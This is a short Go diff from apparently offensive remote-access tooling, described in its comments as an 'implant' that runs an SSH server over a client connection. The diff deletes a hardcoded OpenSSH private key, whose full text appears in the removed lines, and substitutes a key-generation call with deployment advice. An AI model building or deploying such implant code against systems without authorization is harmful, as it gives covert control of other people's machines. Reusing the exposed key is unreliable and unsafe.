@@ -33,7 +33,7 @@ func Wsclient(ua, uri, remoteAdd string) error {
 	s := Session{
 		AuthKeys: make(map[string]bool),
 	}
-	
+
 	PubKeyBytes := []byte(stringPubKey)
 	s.PubKey, _, _, _, err = ssh.ParseAuthorizedKey(PubKeyBytes)
 	utils.Err(err, 17)
@@ -45,15 +45,10 @@ func Wsclient(ua, uri, remoteAdd string) error {
 		PublicKeyCallback: s.pubCallBack, // Challenge with pubkey
 	}
 
-	privKey := []byte(`-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
-1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQ5u5RSQEn7VjPQZsPrEJ4zba+PMF4U
-kQ3+N11IW30QU9OY+XWePtqlIT7eYLoJBAkiDczrNpxs9IZAhUxg6jyDAAAAqC+nArwvpw
-K8AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm7lFJASftWM9Bm
-w+sQnjNtr48wXhSRDf43XUhbfRBT05j5dZ4+2qUhPt5gugkECSINzOs2nGz0hkCFTGDqPI
-MAAAAgUnybP9gbz6kYON6APaQXd+MVK1jXVSVkMJ+fnUSGq+oAAAALZmFyaW5hcEB4eXoB
-AgMEBQ==
------END OPENSSH PRIVATE KEY-----`)
+	// SSH private key is intentionally embedded in the implant binary.
+	// Generate and replace this key pair before deploying:
+	//   ssh-keygen -t ecdsa -f implant_host_key -N ""
+	privKey := GeneratePrivKey()
 	pkey, err := ssh.ParsePrivateKey(privKey)
 	utils.Err(err, 18)
 	config.AddHostKey(pkey)
@@ -63,6 +58,6 @@ AgMEBQ==
 	go ssh.DiscardRequests(reqs)
 
 	s.HandServerConn(conn.Permissions.Extensions["x"], chans)
-	
+
 	return nil
 }
